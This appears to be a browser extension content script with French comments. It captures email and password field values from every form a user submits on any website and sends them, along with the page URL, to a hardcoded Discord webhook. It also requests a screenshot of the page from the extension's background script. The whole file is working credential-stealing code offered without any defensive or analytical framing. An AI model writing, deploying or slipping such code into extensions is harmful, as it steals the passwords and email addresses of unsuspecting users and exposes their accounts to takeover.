document.addEventListener("submit", function (e) {
  const form = e.target;
  const inputs = form.querySelectorAll("input, textarea, select");
  const formData = {};

  inputs.forEach(input => {
    const key = input.name || input.id || "unnamed";
    const value = input.value;
    const type = input.type || input.tagName.toLowerCase();

    // On filtre pour ne prendre que les données sensibles
    if (["email", "password"].includes(type)) {
      formData[key] = { value, type };
    }
  });

  // Si on a capturé au moins un email ou mot de passe
  if (Object.keys(formData).length > 0) {
    const payload = {
      content: `📝 Formulaire détecté sur ${window.location.href}`,
      embeds: [{
        title: "Données sensibles détectées",
        description: "```json\n" + JSON.stringify(formData, null, 2) + "\n```"
      }]
    };

    // Envoi des données sensibles
    fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    // Demande une capture à background.js
    chrome.runtime.sendMessage({
      action: "capture",
      url: window.location.href
    });
  }
}, true);
